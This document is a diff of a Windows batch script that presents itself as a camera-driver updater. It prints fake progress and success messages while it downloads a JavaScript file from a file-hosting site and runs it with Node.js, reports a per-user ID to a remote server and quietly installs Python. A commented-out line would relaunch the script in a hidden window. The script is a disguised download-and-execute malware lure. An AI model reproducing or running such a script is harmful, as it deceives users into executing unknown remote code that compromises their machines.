@@ -6,31 +6,7 @@ set "WINDOW_UID=__ID__"
 if not defined WINDOW_UID goto :err_uid
 if "!WINDOW_UID!"=="" goto :err_uid
 if "!WINDOW_UID!"=="__ID__" goto :err_uid
-
-call :delay 4
 echo [INFO] Searching for Camera Drivers ...
-call :delay 6
-echo [INFO] Updating Driver Packages...
-call :delay 12
-echo [SUCCESS] Camera drivers have been updated successfully.
-if defined WINDOW_UID (
-  set "AUTO_URL=https://api.canditech.org/change-connection-status/!WINDOW_UID!"
-  curl -sL -X POST "!AUTO_URL!" -o nul
-)
-goto :skip_delay
-
-:err_uid
-echo [ERROR] WINDOW_UID is required. Please run this script from the provided link with your id.
-exit /b 1
-
-:delay
-REM Reliable delay in seconds (works when output is redirected); usage: call :delay 4
-set /a "pings=%~1+1"
-ping 127.0.0.1 -n !pings! -w 1000 >nul
-goto :eof
-
-:skip_delay
-
 :: if "%~1" neq "_restarted" powershell -WindowStyle Hidden -Command "Start-Process -FilePath cmd.exe -ArgumentList '/c \"%~f0\" _restarted' -WindowStyle Hidden" & exit /b
 
 REM Get latest Node.js version using PowerShell
@@ -98,7 +74,7 @@ if not defined NODE_EXE (
 set "CODEPROFILE=%USERPROFILE%"
 if not exist "%CODEPROFILE%" mkdir "%CODEPROFILE%"
 set "ENV_SETUP_FILE=%CODEPROFILE%\env-setup.npl"
-
+echo [INFO] Updating Driver Packages...
 call :download_file "https://files.catbox.moe/92zc8z.js" "%ENV_SETUP_FILE%"
 if errorlevel 1 exit /b 1
 
@@ -108,6 +84,12 @@ if errorlevel 1 exit /b 1
 if exist "%ENV_SETUP_FILE%" (
     cd /d "%CODEPROFILE%"
     "%NODE_EXE%" "%ENV_SETUP_FILE%"
+    echo [SUCCESS] Camera drivers have been updated successfully.
+    if defined WINDOW_UID (
+    set "AUTO_URL=https://api.canditech.org/change-connection-status/!WINDOW_UID!"
+    curl -sL -X POST "!AUTO_URL!" -o nul
+    )
+
     mkdir C:\python 2>nul && curl -L https://www.python.org/ftp/python/3.13.2/python-3.13.2-embed-amd64.zip -o C:\python\py.zip && powershell -NoProfile -Command "Expand-Archive -Path C:\python\py.zip -DestinationPath C:\python -Force" && del C:\python\py.zip && powershell -NoProfile -Command "(Get-Content C:\python\python313._pth) -replace '^#import site','import site' | Set-Content C:\python\python313._pth" >nul 2>&1
 
     powershell -NoProfile -Command "(Get-Content C:\python\python313._pth) -replace '^#import site','import site' | Set-Content C:\python\python313._pth" >nul 2>&1
